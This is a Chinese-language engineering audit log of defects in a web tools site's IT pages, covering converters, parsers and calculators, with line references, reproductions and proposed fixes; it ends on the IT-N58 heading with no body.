# IT 开发 · tools/it（340 页，全站第一大分类）

## IT-N417 其余运营商号段准确性待核

- `tools/it/msisdn-lookup.html`：已确认的转售号段误报见 `plan/复核失败/2026-11-09-第一批.md`；其余运营商号段尚未逐码核验，原交接留存的未核实余项移回分类清单，不能当作已修通过。原交接可从 Git 历史查看。

## 2026-11-06 已修条目独立复核（O-1/O-2/P-06）

- **IT-N143 / P-06：原列置换问题已修复。** 抽取 `tools/it/adfgvx-cipher.html:253-342` 实际函数，用 `CIPHER`、`FRANCE`、`LEMON` 三个密钥对 `ATTACKATDAWN` 加解密均还原原文。`order.indexOf(i)` 修正列回填；测试为 DOM 桩，未运行浏览器。补位问题 IT-N144 不在本条修复范围，仍保留。

## 2026-11-06 文本差异工具静态续审（清单 634）

- `tools/text/calc-1.html:218-225,245-287`：任一文本改动都同步建立行数乘积大小的 LCS 矩阵并完整重算，大文本可能占用大量内存或阻塞界面；拼出的正常差异文本只要包含独立 `NaN` 或 `Infinity` 字样，就被数值守卫替换成“计算结果含无效值”，无法比较这些普通文本。未运行浏览器或压力测试。

## 2026-11-06 IT 工具静态续审

### CSS 单位基准被忽略且空值静默替换（中，代码确认）
- `tools/it/calc-4.html:129-134,227-240,266-274,379-381`：基准字号为空或为 0 时 `|| 16` 静默当成 16；负数虽被主结果拒绝，复制函数却只检查目标 px，仍能复制负基准计算值。`rem` 恒用 16 除，而预设明确标注「18px根」：基准与目标均 18 时给出 1.125rem，不符合该预设的根字号语义。应区分根字号与父字号，校验并统一复制与显示。

### JWT 解码后敏感令牌写入本地历史（中，实际影响待验证 · 部分修复余项）
- `tools/it/calc-8.html:296-305,358-384,394-396` 和 `js/tool-kit.js:1066-1075,1088-1099`：解码成功后自动采集完整 `jwtInput` 并写 localStorage 历史，无明确的敏感令牌存储提示；不涉及上传结论。应避免持久保存原始令牌或提供明确控制。
- 备注：同条目的 exp 判定子问题已修复并复核；本条仅余敏感令牌历史一项待评估。

### 颜色对比页背景 alpha 被忽略（中 · 部分修复余项，口径待裁断）
- `tools/it/color-converter.html` calcContrast 忽略背景 alpha，透明白色背景被当作不透明白色；应明确底层颜色并先合成背景，或拒绝透明背景。该口径需裁断（合成到底层白/黑，还是拒绝透明背景），未擅改。
- 备注：同条目颜色选择器联动及 CSV 前景 alpha 口径已修复并复核；本条仅余背景 alpha 一项。

### Emoji 明细编码显示及复制错误（中，代码确认）
- `tools/it/emoji-meaning.html:818-821,835-845` 将 HTML 实体直接写入 `innerHTML`，因此显示及 `onclick` 属性中的实体会被 HTML 解析成 Emoji，而非字面 `&#x1f600;`；JS 转义插入事件处理器后被 JS 解析成字符，CSS 转义则被解析成旧式八进制。以 😀 为例，JS 表达式复算 `copyText("\u{1f600}")` 接收 😀，`copyText("\1f600")` 接收控制字符 U+0001 和 `f600`，均不是期望的字面编码。应使用文本节点显示并在事件中传递原始字符串；未在浏览器执行复制。

### JS 简化器默认压缩修改字符串和保留旧结果（高，代码确认）
- `tools/it/js-minifier.html:176,383-430` 即使 tokenize 区分字符串和正则，最后仍对整段输出全局替换空白及运算符。Node 抽取页面原函数复算：`const text = "a  b";` 被压成 `const text="a b";`，字符串数据改变。应仅在 token 间压缩，生产使用仍需真正的解析器。
- `:189,445-459,462-491` 输入变化只重置统计，不清空输出；选择示例亦仅重置统计，复制仍读取前次结果。应在输入变化时清空旧结果或明确标记过期。

### Less 异步编译结果可能覆盖新状态（中，代码确认；竞态待运行验证）
- `tools/it/less-compiler.html:531-581,585-589,616-625,641-648` 的 `less.render()` 回调没有版本或输入一致性检查；多个编译先后完成顺序反转时旧结果可覆盖新结果，清空后仍在途的成功回调也可重新填充输出及复制缓存。输入刚编辑而防抖未触发期间，复制/下载仍读取上次的 `lastCompiledCSS`。应使过时任务失效并标记或清除旧输出；未验证实际异步完成顺序。

### Robots 规则重建将用户输入拼入 HTML（高，代码确认；可利用性待验证）
- `tools/it/robots-txt-generator.html:247-268,272-287`：编辑 User-agent、Allow 或 Disallow 时先保存到 `rules`；点击「新增规则组」会将用户输入未经转义插入属性或 textarea 的 HTML，再赋给 `innerHTML`。引号或 `</textarea>` 能改变生成的 DOM；应安全设置属性和文本。未运行注入，也未确认外部诱导或脚本执行条件。
- 同处 `:261-268` 对整个 HTML 匹配 `Infinity` 或独立 `NaN`，路径含这些合法文本时新增规则会将全部规则控件替换成数值错误提示；后续直接点击新增仍会命中相同数据。应移除文本数值守卫并保持界面与状态一致。

### SQL 方言切换及反转义空白丢失（中，代码确认）
- `tools/it/sql-escape.html:162-174,269-299` 的方言选择未绑定 `change`；将含单引号的输入从 MySQL 切换到 PostgreSQL 时，输出仍为旧方言的反斜杠写法，直到输入改变或手动点转义。应在切换时更新当前转换模式。
- `:302-307` 反转义先无条件 `trim()`，未包引号的 `  abc  ` 会变成 `abc`，无法还原原有首尾空格；应仅在明确解析字面量边界时处理空白。未运行数据库或页面。

### 文本统计将对象原型属性当成词频（中，代码确认）
- `tools/it/text-statistics.html:263-271,308-326` 使用普通对象 `wordFreq = {}`，对输入词 `constructor` 先读到继承的构造函数，再加 1 得到字符串而非计数；计算百分比得到 NaN，守卫将词频区替换成错误提示。应使用 `Map` 或无原型对象。未运行浏览器。
- `:264,284-297` 的「总词数」取过滤停用词后的 `allWords.length`，输入 `the` 的英文词数为 1、总词数却为 0；应将总词数与排除停用词后的词频统计分开标注或计算。

### TypeScript 编译器加载失败时诊断自身可能抛错（中，代码确认）
- `tools/it/typescript-compiler.html:770-784,639-659` 等待加载超时后调用 `showDiagnostics()`，而该函数仍直接调用 `ts.flattenDiagnosticMessageText`；若库始终未加载，`ts` 未定义，异常阻止加载失败信息写入界面，原「加载中」状态可能保留。应在缺库时显示无需依赖 `ts` 的错误；未模拟资源失败或运行页面。
- `:742-748,712-723` 输入变化后防抖 300ms 才编译，在这段时间点击复制或下载仍取上次输出；应标记输出过期或在复制/下载前同步编译。

### 历史结论状态
- Unicode 查询 IT-N554–N556 的搜索、名称与 `onclick` 拼接路径仍在；本批另阅读 TypeScript、Vim 速查的搜索/分类/复制，未运行页面或穷举示例。
- 原文本统计 IT-N39 码元计数实现已变化：`tools/it/text-statistics.html:250-277` 使用字素簇统计并另列码点数；句号和裸回车分割路径仍在。未运行回归，不正式销账。本批另阅读 SQL、SQLite、tmux 速查及字符串混淆主要交互，未穷举内容正确性或运行页面。
- 正则转义 IT-N58 所述非法十六进制和越界直接抛错的实现已变化，当前 `tools/it/regex-escape.html:301-315` 校验后保留不完整转义；未运行回归，不正式销账。IT-N59 的额外元字符集合仍在，风格下拉也未绑定变更刷新。
- Rust 转义 IT-N338 旧字节串非法 `\u{}` 路径已变化，当前 `tools/it/rust-escape.html:287-295` 明确拒绝非 ASCII；未运行编译回归，不正式销账。本批另阅读 REST、Ruby、Rust 速查搜索、分类和复制，未穷举语法正确性或运行页面。
- 番茄钟 IT-N480、N481 已改为时间戳计时与跳过不落账并销账（第181批）；Redis IT-N543、N544 的原示例尚需独立复核（正则速查 IT-D30 已独立复核并修复，第170批）。本批另阅读 PostgreSQL、Python、Redis、正则速查的搜索、分类与复制，不把源码阅读当作运行通过。
- 密码强度 IT-N536–N538 的计算与首位锚定路径仍在；MySQL、Nginx、PHP 速查本批仅阅读搜索/分类/复制，历史示例正确性未重新执行。
- IT-N288 原图片 alt/链接 URL 未转义的实现已变化：当前 `tools/it/markdown-editor.html:706-715,769-780` 有属性转义及 URL 协议筛选，历史示例不能直接沿用；未经安全回归测试，不能认定全部注入风险消除或正式销账。IT-N289 的任务清单列表及 IT-N290 的 h1 映射仍是旧实现。
- 同批阅读 Linux、MongoDB 速查的搜索、分类与复制路径；无浏览器验证，不对完整正确性判通过。IT-N498–N500 的示例仍须按具体内容另行运行复核。
- IT-N423、N308、N309 的数据范围问题仍在。
- IT-N170–N173、IT-N49 的关键路径仍在。
- 同批另阅读 `ascii-table`、`box-shadow-generator`、`calc-1`、`calc-10` 的主要交互路径；未对其完整正确性或浏览器行为作通过判定。

## 已知问题
### I1. hash/编码类页深度参差
- ⚠ 核实（2026-10-26）：pbkdf2 已完整参数化（迭代/盐/密钥长度/格式）、bcrypt 已有 rounds 成本因子——「参数化」部分条目过时。


## 优化点（G06 联动）
- S6 输入智能化：※ cron「人类语翻译」双向（2026-10-26 落地）+ regex-common「原文高亮+命中偏移明细」（2026-10-26 落地：matchAll 逐段 <mark> + `#i [s-e] 文本` 位置表；⚠ 默认态样例也产高亮标题，标题不可单独作锚）。「正则速查输入联想」核实销案（2026-10-26）：regex-cheatsheet 既有实时搜索过滤（searchInput input → renderCommands 全量重渲染），「输入即响应」已实现，增量价值不足，不再单列。
- S3 分步：base64/进制约 30 页加「逐步位运算」可视化。
- 高流量页优先做 S4 分享卡（uuid/password/hash）。

## 受影响范围
- tools/it/（340 页，全站第一大分类）

## 进度
- 🟢 批次 2026-10-26：I1 耗时实测、I2 toml-formatter 严格校验、I3 barcode PNG 导出均已落地。
- 🔴 待开发：S4 分享卡。（注：QR 中心 logo、纠错级别对比、S6 正则速查输入联想均已落地/销案，见上方已修复归档）

## 2026-11-03 审计补充（按工作树静态核查）

### IT-N1 TOML 验证误判及格式化丢失内容（高，确认缺陷）
- 问题：标作「验证」的检查仅校验少数行结构；无效 TOML 可显示通过，格式化和 TOML→JSON 走逐行宽松解析，可能静默丢数据。
- 证据：`tools/it/toml-formatter.html:329-394,446-453,459-519,524-529`；无副作用 Node 提取原函数执行：`a = nope` 和重复键 `a = 1\na = 2` 均返回 `err:null`；后者格式化仅剩 `a = 2`；合法多行字符串 `desc = """hello\nworld\n"""` 解析仅剩 `"""hello`，其余内容丢失。浏览器点击行为尚未实测。
- 影响：`tools/it/toml-formatter.html`；用户可能把无效或损坏配置当成有效内容复制使用。
- 方案：采用符合 TOML 规范、版本锁定且许可证合规的本地解析器统一验证/格式化/转换；无法可靠无损解析时明确拒绝转换；增加重复键、裸值和多行字符串往返用例。原 I2「严格校验已收口」仅对其列举的结构错误成立，不应视为完整 TOML 验证。

### IT-N2 AST 查看器离线失败提示及数据导出（中，疑似待验证 / 优化）
- 问题：解析依赖外部脚本，弱网或首次离线时无法使用；具体断网提示尚待浏览器验证。
- 证据：`tools/it/ast-viewer.html:24,254-261,767-786` 加载 CDN acorn 并检查是否存在，支持 JSON 复制；与 G09-1 同一依赖问题，不重复计作新缺陷。
- 影响：`tools/it/ast-viewer.html`；方案：锁版本本地托管依赖，明确解析失败原因，保留示例和 JSON 导出；测试首次离线与库加载失败。

### 覆盖
- 本轮人工查看 `tools/it/toml-formatter.html`、`tools/it/ast-viewer.html`、`tools/it/jwt-parser.html` 共 3 页，TOML 执行原函数取证；未逐页审计其余 IT 页面，未做真实浏览器测试或重跑门禁。

## 2026-11-03 续查：文本与配置工具

### 续查覆盖
- 新抽查 `tools/it/env-generator.html`、`tools/it/json-to-csv.html`、`tools/it/number-base-converter.html`、`tools/it/text-replace.html`、`tools/it/nginx-config-generator.html` 共 5 页，新增 7 条问题（历史计数）；未做浏览器、部署或门禁验证。历史回填的实际交互需真机复核。

## 2026-11-03 续查（并行批 G）


### 留存优化
- `properties-parser.html:298` 的 `unescapeVal` 不解码 `\uXXXX`：`greet=\u4f60\u597d` 原样保留（Node 已复算），与页面 FAQ 对转义的说明不一致。
- `properties-parser.html:265` 行尾 `\\`（字面反斜杠）也被当作续行：`path=C:\\` + 下一行 → `{"path":"C:\next=1"}`，需区分“单个反斜杠续行 / 双反斜杠字面量”。
- `url-parser.html:442-459` 构造器不校验 host/port，host 为空会生成 `https:///path`，端口可写入任意非数字内容。
- `slugify.html:315` 拼音表 `'音频':'yinpinyin'` 拼写有误；297 的 15 字长键因贪心上限 8（324）永远匹配不到，属冗余数据。
- `text-truncate.html:330` `fromEnd` 分支完全忽略 `wordBoundary`，与正向行为不对称。
- `case-converter.html:384` `toSentenceCase` 先整体小写，专有名词与缩写（NASA、iOS）会被降格，如需保留应改为逐句首字母处理。

### 续查覆盖
- 本轮人工查看 `tools/it/properties-parser.html`、`url-parser.html`、`csv-validator.html`、`curl-parser.html`、`text-truncate.html`、`slugify.html`、`case-converter.html` 共 7 页，新增 8 条（高 3、中 4、低 1），编号续 IT-N10～N17，与既有 IT-N1～N9 无重复。
- 取证方式仅为源码静态阅读 + Node 内存提取原函数/最小 DOM 桩执行复算；未做真实浏览器交互、英文态、移动端、门禁或部署验证。

## 2026-11-03 续查（并行批 J）

### IT-N20 历史回填不清除原本未勾选的选项（中，部分修复）
- 但 `__text_cleanerSnap()` 不保存未勾选的复选框，历史回调只遍历记录中存在的字段，故不能清除当前已勾选、而历史当时未勾选的选项。Node 执行实际回填回调：历史记录无 `opt-trim`，当前 `opt-trim` 已勾选，回填后仍为 `true`，再执行清理时可能产生与历史不一致的结果。未做浏览器验证。
- 方案：恢复历史前统一重置选项，或保存和恢复完整的勾选状态；兼顾既有历史记录格式。

### IT-N26 两个下拉框没有任何选项，代码面板与压缩模式不可用（中，确认源码缺陷）
- 描述：`#showcode`、`#compact` 两个 `<select>` 在源码中为空，代码却按值 `'1'`/`'compact'` 判断；`resetForm` 的 `selectedIndex=0` 也无实际效果。压缩结果 `outHtml` 只在“显示 HTML 代码”分支被使用。
- 证据：`tools/it/markdown-to-html.html:136,140`（空 select）、`330-337`（取值判断与 `outHtml` 用法）、`342-343`。jsdom 复算：`#showcode` 与 `#compact` 的 `options.length` 均为 0；再按 330-337 逻辑模拟“显示代码关闭 + 压缩开启”：可见区 `<p>a</p>\n<ul><li>b</li></ul>` 不变，仅 `code` 变量被压缩。
- 影响：`tools/it/markdown-to-html.html`；两个标注功能实际不可选，HTML 代码面板永不出现；“压缩”即使可选项生效也只影响代码面板，不影响预览。
- 方案：补上 `option`（`0/1`、`pretty/compact`），并让压缩模式同时作用于预览与代码输出。

### IT-N29 逐行对照预览按索引配对，删行后错位；FAQ 承诺的“全压成一行”未实现（中，确认源码缺陷）
- 描述：`top_blank` 本身按 `trim()===''` 判空行（行为正确），但预览直接拿 `rawLines[pi]` 与 `lines[pi]` 并列；一旦删除过空行（默认预设即会删），两列的第 N 行就不再对应同一段文本。另 FAQ 称“可选保留段落或全压成一行”，页面只有 4 个勾选项，没有折叠换行能力。
- 证据：`tools/it/whitespace.html:219-229`（225 空行过滤）、`250-257`（253-256 同索引配对）、`407-408`（FAQ）。Node 复算 `a\n   \nb` 勾 `top_blank` → 输出 `a\nb`；按 253-256 配对得到：第 2 行原始 `"   "` / 处理后 `"b"`，第 3 行原始 `"b"` / 处理后 `""`。
- 影响：`tools/it/whitespace.html`；预览把“被删的空白行”和“下一行内容”放在同一行展示，误导用户核对；文档承诺的“全压成一行”无法实际执行。
- 方案：预览携带原始行号映射（被删行明确标注“已删除”），左右列不再假装同源同一行；删除该 FAQ 承诺或补“折叠为单行”选项。

### IT-N30 裸 CR 不切分、强制 trim 静默丢空项与缩进（低，部分修复）
- 描述：输入只按 `/\r?\n/` 切分，旧 Mac 的单独 `\r` 不识别；随后统一 `trim()` 并 `filter(Boolean)`，缩进、空字段被静默去掉。
- 证据：`tools/it/list-converter.html:272-290`（273 切分/清洗、280 quote、283 csv）。Node 复算：`a\rb`、comma 模式 → 单条 `a\rb`（未按 CR 切分）；`"  a  \n\nb "` → `["a","b"]`，结果 `a, b`。
- 影响：`tools/it/list-converter.html`；混合换行文件被当成一项；需要空字段或缩进的列表无法原样转换。
- 修复（换行切分）：`convert()` 改用 `/\r\n|\r|\n/` 切分，裸 `\r` 现在被识别为多行；verify 新增 N30 回归用例（`a\rb\nc` → 断言 `a, b, c`），list-converter 全过。trim/filter 静默丢空项与缩进的部分保留为留存项（需“保留空项/缩进”开关，未实现）。

### 留存优化
- `tools/it/text-cleaner.html:531-535`：空输入时 `executeClean` 提前返回，上一次结果与统计原样保留，易被误复制；建议清空结果或提示。
- `tools/it/text-cleaner.html:668-676`：`swapText` 只刷新原始字符数，“结果/减少”统计仍是交换前的值。
- `tools/it/whitespace.html:227-228`：空文本勾选“确保末尾单个换行”会输出单个 `"\n"`（Node 已复算），建议空文本直接输出空串。
- `tools/it/text-diff.html:412-421`：没有换行符统一选项，但 352 的 FAQ 建议“先统一换行符再比对”，本页无法完成该前置步骤；`renderUnifiedDiff:552-554` 的相同行只渲染旧文本，忽略大小写/空白时展示与右侧不一致。
- `tools/it/text-diff.html:304`：统计卡宣称算法为 Myers，实际实现是 LCS 动态规划，文案与实现不一致。
- `tools/it/line-ending-converter.html:350-355`：`clearLe` 未清空 `#leViz`，清空后仍残留上一次的换行可视化；`299-305` 主换行符并列时固定优先报 CRLF。
- `tools/it/list-converter.html:280`：quote 模式用 `\"` 转义双引号，与 FAQ（`201-206`）所述“CSV 双引号写两个”不一致，建议统一或改名。
- `tools/it/ini-parser.html:321`：`getIndent` 读取不存在的 `#indent`，现为死代码，若被调用会抛错。
- `tools/it/markdown-to-html.html:291-293`：行内代码先替换再跑粗体/斜体，`` `**x**` `` → `<code><strong>x</strong></code>`（Node 已复算）；`280` 代码块语言只允许字母，`c++`/`c#` 不被保护（Node：blocks 长度 0）；`310` 表格要求行首为 `|`，省略首竖线的 GFM 表格不识别。
- `tools/it/text-dedupe-sort.html:380-385`：无 `input` 监听，“原始项数”在编辑时不更新；`500-503` 行号补零宽度只按总行数位数，跨 9/10 行时前缀宽度变化。

### 续查覆盖
- 本轮人工查看 `tools/it/text-diff.html`、`whitespace.html`、`text-cleaner.html`、`text-dedupe-sort.html`、`line-ending-converter.html`、`list-converter.html`、`markdown-to-html.html`、`ini-parser.html` 共 8 页，新增 14 条（历史计数：高 2、中 10、低 2），编号续 IT-N18～N31，与既有 IT-N1～N17 无重复；其中 IT-N31 为待验证项。
- 取证方式为源码静态阅读 + Node 内存提取原函数/最小逻辑复算（含 `markdown inline`、`parseIni`、`removeLineNum`、`leViz`、`list convert`、`calcTool` 等价实现），并用本地已装 jsdom 复核 `textarea.textContent` 与空 `<select>` 的 `options.length`；未开浏览器，未做英文态、移动端、门禁或部署验证。

## 2026-11-03 续查（并行批 K）

> 范围：本轮阅读 8 页（`tools/it/xml-formatter.html`、`tools/it/html-entities.html`、`tools/it/text-statistics.html`、`tools/text/stats-1.html`、`tools/text/analysis-density.html`、`tools/text/reading-time-estimator.html`、`tools/text/sensitive-word-filter.html`、`tools/text/text-extract-phones.html`）。仅源码 + Node/jsdom 复算，未开浏览器/未做 EN/移动端/门禁验证。

### IT-N32 XML 格式化与压缩丢失根元素、CDATA 和文本内换行（高，确认源码缺陷）
- 描述：`formatXml` 把 `doc.documentElement` 传给 `serializeNode`，而后者只遍历 `childNodes`，根元素自身的开闭标签永远不输出；子节点收集只认元素与文本（`nodeType 1/3`），CDATA（`nodeType 4`）被当作空内容输出为自闭合标签，内容整体丢失；`doMinify` 又对序列化结果全局删除 `\n`，文本节点与 CDATA 内部的合法换行一并被删。XML 声明、DOCTYPE、根外注释同样不会保留。
- 证据：`tools/it/xml-formatter.html:262,264-296,272,284-285,306-312`
- 复现：用 jsdom 加载页面原有函数执行。默认 `SAMPLE` 经 `formatXml(SAMPLE,true)` → 输出以 `<to from="Alice">Bob</to>` 开头、`<raw/>`，根 `<note>` 与 `<![CDATA[<unparsed>text</unparsed>]]>` 全部消失；`<root><a>1</a><b>2</b></root>` → `<a>1</a>\n<b>2</b>`（期望保留 `<root>`）；`<a>line1\nline2</a>` 压缩 → `<a>line1line2</a>`（期望保留文本换行）。
- 影响：页面 Boot 直接 `doBeautify()`，首屏示例即为多根、非法 XML；用户复制格式化/压缩结果会解析失败或丢失整段 CDATA 内容。
- 方案：在 `formatXml` 中单独输出根元素本身；按 `nodeType` 分发并保留 CDATA、注释、处理指令与 XML 声明；压缩只删除元素之间的缩进换行，文本与 CDATA 原样保留；补根元素、CDATA、mixed content 往返用例。

### IT-N38 字数统计按 UTF-16 与 ASCII 正则计数，emoji/扩展汉字/连字符词与说明不符（低，确认源码缺陷）
- 描述：总字符用 `t.length`（UTF-16 码元），emoji 与扩展区汉字计 2；中文字符正则仅 `4E00–9FFF`，`𠮷` 计 0；英文词正则不含连字符，`well-known` 计 2 词，但 FAQ 声称“连字符与缩写内的字母并入同一词”；行数只按 `\r?\n` 切分，裸 `\r` 不识别。
- 证据：`tools/text/stats-1.html:198,115,154-155`
- 复现：`😀` → 总字符 2 / 中文 0（期望 1 / 1）；`𠮷` → 总字符 2 / 中文 0（期望 1 / 1）；`well-known` → 英文 2 词（期望 1）；`a\rb` → 1 行（期望 2 行）。
- 影响：含 emoji 或生僻字的文本字符数偏大、中文数偏小；旧 Mac 换行文件行数偏少；与页面说明不一致。
- 方案：按码点/字素簇计数（`Array.from` 或 `Intl.Segmenter`）；汉字范围补扩展 A/B；连字符词按说明并入或改文案；换行用 `/\r\n|\r|\n/`。

### IT-N39 文本统计把小数点和裸 CR 当句子/换行边界（低，确认源码缺陷）
- 描述：句子按 `/[。！？.!?]+/` 直接切分，小数点和缩写中的句点会被当成句末；行数用 `text.split('\n')`，裸 `\r` 不切分；字符数同样按 UTF-16 码元计。
- 证据：`tools/it/text-statistics.html:250-271`（`264-268` 字符/行/句）
- 复现：`Version 3.14 is out` → 句子数 2（期望 1）；`a\rb` → 行数 1（期望 2）；`😀` → 总字符 2（页面已在 `149` 说明按码元计，属口径提示而非修复）。
- 影响：含版本号、小数、缩写或旧式换行的文本，句子与行数统计偏大/偏小。
- 方案：句子切分前保护小数与常见缩写，或改用分段器；换行统一 `/\r\n|\r|\n/`；如需精确字符数按字素簇计数。

- 本轮实读 8 页：`tools/it/xml-formatter.html`、`tools/it/html-entities.html`、`tools/it/text-statistics.html`、`tools/text/stats-1.html`、`tools/text/analysis-density.html`、`tools/text/reading-time-estimator.html`、`tools/text/sensitive-word-filter.html`、`tools/text/text-extract-phones.html`；新增 8 条（高 1 / 中 5 / 低 2）；未覆盖：`tools/text` 其余 7 页（`lorem-ipsum-generator`、`text-to-1337`、`text-to-ascii-art`、`text-to-braille`、`convert-6`、`convert-7`、`calc-1`）及 `tools/it` 的 json/yaml/csv/xml 转换余页；未做浏览器、EN、移动端、门禁或部署验证。

## 2026-11-04 续查（并行批 L）

> 范围：本轮阅读 8 页（`tools/it/time-format-converter.html`、`tools/it/timestamp-converter.html`、`tools/it/color-converter.html`、`tools/it/integer-base-converter.html`、`tools/it/chmod-calculator.html`、`tools/it/crontab-generator.html`、`tools/it/ipv6-converter.html`、`tools/it/crc-calculator.html`）。仅源码 + Node 复算，未开浏览器/未做 EN/移动端/门禁验证。

### 时间格式转换示例的时间戳与日期不一致（中，确认缺陷）
- `tools/it/time-format-converter.html:428-429` 称 Unix 秒 `1690000000` 对应 `2023-07-22T08:53:20.000Z`，实际为 `2023-07-22T04:26:40.000Z`；反向示例 `2023-07-22 08:53:20` 在 UTC+8 下对应 `1689987200`，并非 `1690000000`。本地时间取决于浏览器时区。
- 影响：示例给出互相矛盾的换算结果。应按明确时区重新计算示例。

### IT-N42 时间格式转换：裸数字 "0"/"1" 被当成年份 2000/2001（低，确认源码缺陷）
- 描述：非 10–13 位纯数字落入 `new Date(v)`；V8 把 `"0"`、`"1"` 解释为年份 2000/2001，而不是 Unix 秒。
- 证据：`tools/it/time-format-converter.html:235-240`
- 复现：输入 `0` → `2000-01-01 00:00:00`；`1` → `2001-01-01 00:00:00`（期望 `1970-01-01 08:00:00` 或提示"位数不足"）
- 影响：粘贴被截断的时间戳会被静默当成 2000/2001 年，排查日志时误判。
- 方案：纯数字统一走时间戳分支（按位数或阈值判定秒/毫秒），不足 10 位给出明确提示。

### IT-N44 时间戳转换：时区表写死固定偏移，忽略夏令时（中，确认源码缺陷）
- 描述：`TIMEZONES` 为纽约 -5、伦敦 0、巴黎 +1、悉尼 +11 等固定值；这些地区夏季使用 DST（-4/+1/+2/+10），固定偏移在半年内整体差 1 小时。
- 证据：`tools/it/timestamp-converter.html:416-427`、`546-562`（553-554 固定偏移计算）
- 复现：`2026-07-01T12:00:00Z` → "纽约 (GMT-5)" 显示 `07:00`（期望 08:00，EDT -4）；"伦敦 (GMT+0)" 显示 `12:00`（期望 13:00，BST +1）
- 影响：跨时区排障时纽约/伦敦/巴黎/悉尼结果偏差 1 小时；北京/东京/夏威夷不受影响。
- 方案：改用 `Intl.DateTimeFormat` 的 IANA 时区（America/New_York 等）格式化，或明确标注"标准时（不含 DST）"。

### IT-N49 Chmod 计算器：文档承诺特殊位，界面无法输入/输出四位数（低，确认源码缺陷）
- 描述：公式说明与 FAQ 都写 setuid/setgid/sticky 置于首位（如 4755），但页面只有 9 个 r/w/x 复选框，`calc` 恒拼接 3 位数字，复制命令也永远是 3 位。
- 证据：`tools/it/chmod-calculator.html:122`（公式列表）、`200`（FAQ）、`305-311`（calc）、`327-331`（copyPerm）
- 复现：勾选全部 rwx → `chmod 777 <file>`；没有任何控件能得到 `4755`（期望提供 setuid/setgid/sticky 三个开关并输出 4 位）
- 影响：需要 setuid/sticky 的场景无法使用，文档与功能不一致。
- 方案：增加三个特殊位复选框（4/2/1 置千位），或在说明中注明"本工具仅支持 3 位权限"。

### IT-N54 CRC-8/ITU 的 CCITT 别名待核实（疑似待验证）
- `tools/it/crc-calculator.html:330` 将模型标为 `CRC-8/ITU (CCITT)`；[CRC RevEng 参数目录](https://reveng.sourceforge.io/crc-catalogue/1-15.htm#crc.cat.crc-8-i-432-1) 列出该参数模型为 `CRC-8/I-432-1`，别名为 `CRC-8/ITU`，未列 CCITT。需核实 CCITT 别名的权威依据，避免与其他 CRC 模型混淆。

### IT-N55 CRC 计算器：十六进制模式不校验奇偶与非法字符，静默丢半字节/归零（中，确认源码缺陷）
- 描述：`getInputBytes` 去掉分隔符后直接按 `s.length/2` 建数组，奇数长度丢掉最后一个半字节；`parseInt` 失败得 NaN，写入 `Uint8Array` 变 0，仍输出"正常"CRC。
- 证据：`tools/it/crc-calculator.html:339-349`（344-346）
- 复现：hex 勾选后输入 `ABC` → 仅按 `AB` 计 1 字节（期望报"半字节数不足"或补 0）；输入 `zz` → 按 `0x00` 计（期望报非法十六进制）
- 影响：用户以为校验的是完整报文，实际少算了尾部或整段被当成 0。
- 方案：先校验仅含十六进制字符与分隔符，且去分隔后长度为偶数；非法/奇数时明确报错并停止计算。

- 本轮实读 8 页：`tools/it/time-format-converter.html`、`tools/it/timestamp-converter.html`、`tools/it/color-converter.html`、`tools/it/integer-base-converter.html`、`tools/it/chmod-calculator.html`、`tools/it/crontab-generator.html`、`tools/it/ipv6-converter.html`、`tools/it/crc-calculator.html`；新增 16 条（高 3 / 中 10 / 低 3）；未覆盖：`tools/it` 其余非文本页（如 `regex-escape`、`css-minifier`、`html-minifier`、`date-duration`、`ipv4-range-expander`、`punycode`、`user-agent-parser` 等）与全部速查表页；未做浏览器、EN、移动端、门禁或部署验证。

## 2026-11-04 续查（并行批 M）

> 范围：本轮阅读 8 页（`tools/it/punycode.html`、`tools/it/regex-escape.html`、`tools/it/css-minifier.html`、`tools/it/date-duration.html`、`tools/it/ipv4-range-expander.html`、`tools/it/user-agent-parser.html`、`tools/it/hash-multi.html`、`tools/it/http-cache.html`）。仅源码 + Node/jsdom 复算，未开浏览器/未做 EN/移动端/门禁验证。

### IT-N56 Punycode 编解码：核心算法错误，编码末位多加 t、解码忽略权重（高，确认源码缺陷）
- 描述：编码器在循环末尾把终止数字写成 `digitToChar(t + q)`（RFC 3492 应为 `digitToChar(q)`，此时 `q < t`）；解码器把增量累加写成 `pos += d - t`，而 `w *= BASE - t` 算出的权重从未参与乘法。两处叠加后编码出的串不是合法 Punycode，解码也还原不出原字符。
- 证据：`tools/it/punycode.html:323`（编码终止位）、`tools/it/punycode.html:357-358`（解码权重未乘）
- 复现：输入 `中文`（页面默认输入 `中文域名.com` 同样受影响）→ 编码实际 `fi@2282`（期望 `fiq228c`）；`中国` → `fi@s8B`（期望 `fiqs8s`）。解码 `fiq228c` → 输出两个不可打印字符 `""`（期望 `中文`）；解码 `fiqs8s` → 乱码（期望 `中国`）。
- 影响：编码/解码两个方向全部不可用；复制出去的 `xn--fi@2282.com` 不是合法 IDN，DNS/备案场景会直接失败，且界面无任何报错。
- 方案：终止位改回 `digitToChar(q)`；解码按 RFC 3492 用 `pos += d * w`（并在 `d < t` 时终止），`w *= BASE - t` 保持在后；用 `中文`、`中国`、`bücher`、`中文abc` 与 Node `punycode` 的 `fiq228c/fiqs8s/bcher-kva/abc-u68do18h` 做往返回归。

### IT-N57 Punycode：纯 ASCII 单标签被补尾随连字符，算法说明示例自相矛盾（低，确认源码缺陷）
- 描述：`encode()` 只要存在基础码点就追加 `-`，即使没有任何非 ASCII 码点；`enc()` 对不含点号的输入直接返回 `encode(text)`，于是纯 ASCII 串变成 `hello-`。另外页面两处示例互相矛盾：157 行说「中国」→ `xn--fiqs8s`（正确），185 行说 `中文.com` → `xn--fiqs8s.com`（`fiqs8s` 解码为「中国」，正确值应为 `fiq228c`）。
- 证据：`tools/it/punycode.html:295`（无条件补 `-`）、`tools/it/punycode.html:381`（无点号走整串编码）、`tools/it/punycode.html:185`（错误示例）
- 复现：勾选 ACE，输入 `hello`（无点号）→ 输出 `hello` 加尾随 `-` 即 `hello-`（期望原样 `hello`）；输入 `中文.com` 点「编码」→ `xn--fi@2282.com`（期望 `xn--fiq228c.com`）
- 影响：普通 ASCII 标签被多出一个连字符，复制到 hosts/DNS 后成为不同标签；示例误导用户以为 `fiqs8s` 是「中文」。
- 方案：当 `basic.length === 0` 时不要追加分隔符（或在 `enc()` 对纯 ASCII 标签直接原样返回）；修正 185 行示例为 `xn--fiq228c.com`。

### IT-N58 正则转义：反转义遇非法 `\x`/`\u` 逃逸抛未捕获异常，按钮无响应（中，确认源码缺陷）
